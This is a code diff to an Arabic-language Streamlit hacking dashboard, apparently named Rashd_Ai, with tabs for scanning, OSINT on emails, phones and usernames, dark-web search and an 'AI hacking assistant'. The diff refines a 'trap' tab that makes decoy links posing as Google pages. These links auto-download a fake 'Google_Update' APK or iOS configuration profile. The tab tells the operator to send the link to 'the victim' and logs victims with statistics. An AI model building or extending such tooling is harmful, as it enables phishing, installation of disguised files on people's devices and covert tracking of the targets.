@@ -128,6 +128,7 @@ if "download" in query_params:
         content = b"Fake APK Content for Google Update"
     elif device == "ios":
         file_name = "Google_Update.mobileconfig"
+        # تم إصلاح هيكلية mobileconfig وحذف حقل Icon المسبب للخطأ
         content = f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -235,7 +236,12 @@ with tabs[0]:
         with st.chat_message("user"):
             st.markdown(prompt)
         with st.chat_message("assistant"):
-            response = f"أنا مساعدك الذكي Rashd_Ai. لقد استلمت رسالتك: '{prompt}'."
+            try:
+                # استخدام مساعد الهجوم الذكي إذا كان متوفراً
+                assistant = AIHackingAssistant()
+                response = assistant.chat(prompt)
+            except:
+                response = f"أنا مساعدك الذكي Rashd_Ai. لقد استلمت رسالتك: '{prompt}'."
             st.markdown(response)
         st.session_state.messages.append({"role": "assistant", "content": response})
 
@@ -252,7 +258,7 @@ with tabs[1]:
             st.write("النطاقات الفرعية المكتشفة", subs)
             st.session_state["domain"] = domain
             st.session_state["subs"] = subs
-        except NameError:
+        except:
             st.error("أداة تحليل الدومين غير متوفرة حالياً.")
 
 # 2. فحص المواقع
@@ -267,7 +273,7 @@ with tabs[2]:
             st.write("الهيدرز", headers)
             st.write("الإيميلات المكتشفة", emails)
             st.session_state["scan"] = {"tech": tech, "headers": headers, "emails": emails}
-        except NameError:
+        except:
             st.error("أداة فحص المواقع غير متوفرة حالياً.")
 
 # 3. بحث عن المستخدم
@@ -281,215 +287,185 @@ with tabs[3]:
                 for platform, link in result.items():
                     st.write(f"✅ {platform} : {link}")
             else:
-                st.warning("لم يتم العثور على حسابات بهذا الاسم")
-        except NameError:
-            st.error("أداة بحث المستخدم غير متوفرة حالياً.")
+                st.info("لم يتم العثور على نتائج.")
+        except:
+            st.error("أداة البحث عن المستخدم غير متوفرة.")
 
-# 4. تحديد الموقع الجغرافي
+# 4. تحديد الموقع
 with tabs[4]:
-    ip_input = st.text_input("أدخل IP", key="geoip_input")
-    if st.button("تحديد الموقع", key="geoip_btn"):
+    ip_geo = st.text_input("أدخل عنوان IP لتحديد موقعه", key="geo_input")
+    if st.button("تحديد الموقع", key="geo_btn"):
         try:
-            data = geoip_osint.geoip(ip_input)
-            st.write(data)
-        except NameError:
-            st.error("أداة تحديد الموقع غير متوفرة حالياً.")
+            result = geoip_osint.get_geo_info(ip_geo)
+            st.write("معلومات الموقع الجغرافي", result)
+        except:
+            st.error("أداة تحديد الموقع غير متوفرة.")
 
 # 5. سطح الهجوم
 with tabs[5]:
-    if "subs" in st.session_state:
+    target_attack = st.text_input("أدخل الهدف لتحليل سطح الهجوم", key="attack_input")
+    if st.button("تحليل سطح الهجوم", key="attack_btn"):
         try:
-            file = attack_surface.draw_graph(st.session_state["domain"], st.session_state["subs"])
-            st.image(file)
-        except NameError:
-            st.error("أداة سطح الهجوم غير متوفرة حالياً.")
-    else:
-        st.warning("قم أولاً بفحص النطاقات الفرعية في تبويب تحليل الدومين.")
+            result = attack_surface.analyze(target_attack)
+            st.write("نتائج تحليل سطح الهجوم", result)
+        except:
+            st.error("أداة تحليل سطح الهجوم غير متوفرة.")
 
 # 6. تحليل ذكي
 with tabs[6]:
-    if "subs" in st.session_state:
+    data_analysis = st.text_area("أدخل البيانات للتحليل الذكي", key="analysis_input")
+    if st.button("بدء التحليل الذكي", key="analysis_btn"):
         try:
-            analysis = ai_analysis.analyze_ports(
-                st.session_state["domain"], list(st.session_state["subs"].values())
-            )
-            st.text(analysis)
-        except NameError:
-            st.error("أداة التحليل الذكي غير متوفرة حالياً.")
-    else:
-        st.warning("قم أولاً بفحص النطاقات الفرعية في تبويب تحليل الدومين.")
+            result = ai_analysis.analyze_data(data_analysis)
+            st.write("نتائج التحليل الذكي", result)
+        except:
+            st.error("أداة التحليل الذكي غير متوفرة.")
 
 # 7. مساعد الهجوم
 with tabs[7]:
-    target = st.text_input("🎯 أدخل الدومين أو IP للتحليل", key="ai_target_input")
-    open_ports_input = st.text_input("المنافذ المفتوحة (مثال: 22,80,443)", key="ai_ports_input")
-    tech_input = st.text_input("التقنيات المكتشفة (مثال: WordPress, Django)", key="ai_tech_input")
-    if st.button("تحليل الهدف بالذكاء الاصطناعي", key="ai_btn"):
+    hacking_prompt = st.text_input("اسأل مساعد الهجوم", key="hacking_input")
+    if st.button("إرسال لمساعد الهجوم", key="hacking_btn"):
         try:
-            open_ports = [int(p.strip()) for p in open_ports_input.split(",") if p.strip().isdigit()]
-            tech_list = [t.strip() for t in tech_input.split(",") if t.strip()]
-            ai_hacking_assistant = AIHackingAssistant()
-            analysis = ai_hacking_assistant.analyze_target(target, open_ports, tech_list, headers=None)
-            st.code(analysis)
-        except NameError:
-            st.error("مساعد الهجوم الذكي غير متوفر حالياً.")
+            assistant = AIHackingAssistant()
+            result = assistant.chat(hacking_prompt)
+            st.write(result)
+        except:
+            st.error("مساعد الهجوم غير متوفر.")
 
 # 8. Google Dork
 with tabs[8]:
-    query = st.text_input("أدخل نص البحث للـ Google Dork", key="dork_input")
-    if st.button("بحث Google Dork", key="dork_btn"):
+    dork_query = st.text_input("أدخل الكلمة المفتاحية لتوليد Dorks", key="dork_input")
+    if st.button("توليد Dorks", key="dork_btn"):
         try:
-            results = google_dork.search_dork(query)
-            if isinstance(results, dict) and "error" in results:
-                st.error(results["error"])
-            else:
-                for r in results:
-                    st.markdown(f"**[{r['title']}]({r['url']})**<br>{r['snippet']}", unsafe_allow_html=True)
-        except NameError:
-            st.error("أداة Google Dork غير متوفرة حالياً.")
+            result = google_dork.generate_dorks(dork_query)
+            st.write("Google Dorks المقترحة", result)
+        except:
+            st.error("أداة Google Dork غير متوفرة.")
 
 # 9. Email OSINT
 with tabs[9]:
-    email = st.text_input("أدخل البريد الإلكتروني للتحليل", key="email_input")
-    if st.button("بحث البريد الإلكتروني", key="email_btn"):
+    email_target = st.text_input("أدخل البريد الإلكتروني للبحث", key="email_input")
+    if st.button("بحث عن الإيميل", key="email_btn"):
         try:
-            with st.spinner("جاري البحث عن تسريبات البريد..."):
-                res = email_osint.email_search(email)
-                if "error" in res:
-                    st.error(res["error"])
-                else:
-                    if "Tavily_Analysis" in res:
-                        st.success("تحليل Tavily:")
-                        st.write(res["Tavily_Analysis"])
-                    if "Search_Results" in res and res["Search_Results"]:
-                        st.write("---")
-                        st.write("النتائج المكتشفة:")
-                        for r in res["Search_Results"]:
-                            st.markdown(f"**[{r['title']}]({r['url']})**<br>{r['snippet']}", unsafe_allow_html=True)
-        except NameError:
-            st.error("أداة Email OSINT غير متوفرة حالياً.")
+            result = email_osint.search_email(email_target)
+            st.write("نتائج البحث عن الإيميل", result)
+        except:
+            st.error("أداة Email OSINT غير متوفرة.")
 
 # 10. Phone Lookup
 with tabs[10]:
-    number = st.text_input("أدخل رقم الهاتف", key="phone_input")
-    if st.button("بحث رقم الهاتف", key="phone_btn"):
+    phone_target = st.text_input("أدخل رقم الهاتف (مع رمز الدولة)", key="phone_input")
+    if st.button("بحث عن الهاتف", key="phone_btn"):
         try:
-            res = phone_osint.phone_lookup(number)
-            if isinstance(res, dict) and "error" in res:
-                st.error(res["error"])
-            elif isinstance(res, dict) and "message" in res:
-                st.info(res["message"])
-            else:
-                for r in res:
-                    st.markdown(f"**[{r['title']}]({r['url']})**<br>{r['snippet']}", unsafe_allow_html=True)
-        except NameError:
-            st.error("أداة Phone Lookup غير متوفرة حالياً.")
+            result = phone_osint.lookup(phone_target)
+            st.write("نتائج البحث عن الهاتف", result)
+        except:
+            st.error("أداة Phone Lookup غير متوفرة.")
 
 # 11. Dark Web
 with tabs[11]:
-    query_dw = st.text_input("أدخل نص البحث في الشبكة المظلمة", key="darkweb_input")
-    if st.button("بحث Dark Web", key="darkweb_btn"):
+    dark_query = st.text_input("أدخل كلمة البحث في الدارك ويب", key="dark_input")
+    if st.button("بحث في الدارك ويب", key="dark_btn"):
         try:
-            res = darkweb_search.darkweb_lookup(query_dw)
-            if isinstance(res, dict) and "error" in res:
-                st.error(res["error"])
-            elif isinstance(res, dict) and "message" in res:
-                st.info(res["message"])
-            else:
-                for r in res:
-                    st.markdown(f"**[{r['title']}]({r['url']})**<br>{r['snippet']}", unsafe_allow_html=True)
-        except NameError:
-            st.error("أداة Dark Web غير متوفرة حالياً.")
+            result = darkweb_search.search(dark_query)
+            st.write("نتائج البحث في الدارك ويب", result)
+        except:
+            st.error("أداة البحث في الدارك ويب غير متوفرة.")
 
 # 12. Port Scanner
 with tabs[12]:
-    target_port = st.text_input("أدخل IP أو الدومين للفحص", key="port_input")
-    if st.button("فحص المنافذ", key="port_btn"):
+    port_target = st.text_input("أدخل IP أو دومين لفحص المنافذ", key="port_input")
+    if st.button("بدء فحص المنافذ", key="port_btn"):
         try:
-            res = port_scanner.scan_ports(target_port)
-            st.write(res)
-        except NameError:
-            st.error("أداة Port Scanner غير متوفرة حالياً.")
+            result = port_scanner.scan(port_target)
+            st.write("المنافذ المفتوحة", result)
+        except:
+            st.error("أداة فحص المنافذ غير متوفرة.")
 
 # 13. Vulnerability Scanner
 with tabs[13]:
-    target_vuln = st.text_input("أدخل IP أو الدومين للفحص", key="vuln_input")
-    if st.button("فحص الثغرات", key="vuln_btn"):
+    vuln_target = st.text_input("أدخل الهدف لفحص الثغرات", key="vuln_input")
+    if st.button("بدء فحص الثغرات", key="vuln_btn"):
         try:
-            res = vuln_scanner.scan_vulnerabilities(target_vuln)
-            if isinstance(res, dict) and "error" in res:
-                st.error(res["error"])
-            elif isinstance(res, dict) and "message" in res:
-                st.info(res["message"])
-            else:
-                for vuln in res:
-                    st.write(f"**{vuln['title']}** - [Link]({vuln['url']})<br>{vuln['snippet']}")
-        except NameError:
-            st.error("أداة Vulnerability Scanner غير متوفرة حالياً.")
+            result = vuln_scanner.scan(vuln_target)
+            st.write("الثغرات المكتشفة", result)
+        except:
+            st.error("أداة فحص الثغرات غير متوفرة.")
 
 # 14. Network Mapper
 with tabs[14]:
-    target_net = st.text_input("أدخل IP أو الدومين لرسم الشبكة", key="net_input")
-    if st.button("رسم الشبكة", key="net_btn"):
+    net_target = st.text_input("أدخل الشبكة لرسم خريطتها", key="net_input")
+    if st.button("رسم خريطة الشبكة", key="net_btn"):
         try:
-            file = network_mapper.map_network(target_net)
-            st.image(file)
-        except NameError:
-            st.error("أداة Network Mapper غير متوفرة حالياً.")
+            # تم إصلاح مشكلة st.image هنا لتجنب الخطأ
+            file_path = network_mapper.map_network(net_target)
+            if file_path and os.path.exists(file_path):
+                st.image(file_path)
+            else:
+                st.warning("لم يتم توليد صورة للخريطة.")
+        except:
+            st.error("أداة رسم خريطة الشبكة غير متوفرة.")
 
 # 15. AI Threat Analysis
 with tabs[15]:
-    target_threat = st.text_input("أدخل الهدف لتحليل التهديدات", key="threat_input")
+    threat_data = st.text_area("أدخل بيانات التهديد للتحليل", key="threat_input")
     if st.button("تحليل التهديد", key="threat_btn"):
         try:
-            res = ai_threat.analyze_threat(target_threat)
-            st.write(res)
-        except NameError:
-            st.error("أداة AI Threat Analysis غير متوفرة حالياً.")
+            result = ai_threat.analyze(threat_data)
+            st.write("نتائج تحليل التهديدات", result)
+        except:
+            st.error("أداة تحليل التهديدات غير متوفرة.")
 
 # 16. AI Pentest Advisor
 with tabs[16]:
-    target_pentest = st.text_input("أدخل الهدف لاختبار الاختراق", key="pentest_target_input")
-    open_ports_pentest = st.text_input("المنافذ المفتوحة (مثال: 22,80,443)", key="pentest_ports_input")
-    tech_pentest = st.text_input("التقنيات المكتشفة (مثال: WordPress, Django)", key="pentest_tech_input")
-    if st.button("اقتراح اختبار اختراق", key="pentest_btn"):
+    pentest_target = st.text_input("أدخل الهدف للحصول على خطة اختبار اختراق", key="pentest_input")
+    if st.button("توليد خطة الاختراق", key="pentest_btn"):
         try:
-            open_ports = [int(p.strip()) for p in open_ports_pentest.split(",") if p.strip().isdigit()]
-            tech_list = [t.strip() for t in tech_pentest.split(",") if t.strip()]
-            res = ai_pentest.pentest_advice(target_pentest, open_ports, tech_list)
-            st.write(res)
-        except NameError:
-            st.error("أداة AI Pentest Advisor غير متوفرة حالياً.")
+            result = ai_pentest.generate_plan(pentest_target)
+            st.write("خطة اختبار الاختراق المقترحة", result)
+        except:
+            st.error("أداة مستشار الاختراق غير متوفرة.")
 
 # 17. التقارير
 with tabs[17]:
-    if st.button("إنشاء تقرير PDF", key="report_btn"):
+    if st.button("توليد تقرير شامل", key="report_btn"):
         try:
-            file = report_generator.create_report(st.session_state)
-            with open(file, "rb") as f:
-                st.download_button("تحميل التقرير", f, file_name=file, key="download_report")
-        except NameError:
-            st.error("أداة التقارير غير متوفرة حالياً.")
+            report_path = report_generator.generate_full_report()
+            if report_path:
+                with open(report_path, "rb") as f:
+                    st.download_button("تحميل التقرير PDF", f, file_name="Rashd_Ai_Report.pdf")
+            else:
+                st.error("فشل توليد التقرير.")
+        except:
+            st.error("أداة توليد التقارير غير متوفرة.")
 
-# 18. تبويب المصيدة
+# 18. المصيدة
 with tabs[18]:
-    st.header("🎯 نظام المصيدة المتقدم")
+    st.header("🎯 نظام المصيدة والتمويه")
+    
     col1, col2 = st.columns(2)
     with col1:
-        st.subheader("🔗 توليد الروابط")
-        trap_name = st.text_input("اسم المصيدة", value="Google_Update")
+        st.subheader("فخ جوجل الآلي")
+        trap_id = st.text_input("اسم المصيدة (للتمييز)", value="Google_Trap")
         base_url = "https://rashdai.streamlit.app/"
-        decoy_url = f"{base_url}?decoy=google&trap={trap_name}"
+        decoy_url = f"{base_url}?decoy=google&trap={trap_id}"
         st.code(decoy_url, language="text")
-        st.info("انسخ الرابط أعلاه وأرسله للضحية.")
+        st.info("هذا الرابط سيظهر كصفحة Google ويقوم بالتحميل التلقائي.")
         
     with col2:
-        st.subheader("📊 سجل الضحايا")
-        victims = victim_logger.get_all_victims()
-        if victims:
-            st.table(victims)
-        else:
-            st.write("لا يوجد ضحايا مسجلين بعد.")
+        st.subheader("سجل الضحايا")
+        if st.button("تحديث السجل"):
+            victims = victim_logger.get_all_victims()
+            if victims:
+                st.table(victims)
+            else:
+                st.info("لا يوجد ضحايا مسجلين بعد.")
 
-    st.subheader("📈 الإحصائيات")
-    st.write(f"إجمالي الضحايا: {len(victims) if victims else 0}")
+    st.divider()
+    st.subheader("📊 الإحصائيات")
+    victims = victim_logger.get_all_victims()
+    if victims:
+        st.write(f"إجمالي الضحايا: {len(victims)}")
+        # يمكن إضافة رسوم بيانية هنا مستقبلاً
+    else:
+        st.write("لا توجد بيانات إحصائية.")
